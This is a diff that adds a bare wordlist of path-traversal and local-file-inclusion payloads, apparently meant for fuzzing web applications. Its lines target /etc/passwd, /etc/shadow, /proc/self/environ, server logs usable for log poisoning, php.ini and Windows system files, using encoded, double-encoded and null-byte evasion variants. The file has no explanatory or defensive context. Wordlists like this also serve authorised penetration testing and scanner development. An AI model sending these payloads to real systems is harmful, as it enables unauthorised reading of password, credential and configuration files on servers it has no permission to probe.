@@ -1,0 +1,15 @@
+../../../../etc/passwd
+....//....//etc/shadow
+%2fetc%2fpasswd
+/etc/passwd%00
+..%5c..%5c/etc/passwd
+/var/log/apache2/access.log
+/var/log/auth.log
+/var/log/nginx/access.log
+/var/www/html/index.php
+../../../../../proc/self/environ
+/usr/local/etc/php.ini
+../../boot.ini
+..%255c..%255cwin.ini
+C:\Windows\System32\drivers\etc\hosts
+file:///etc/passwd
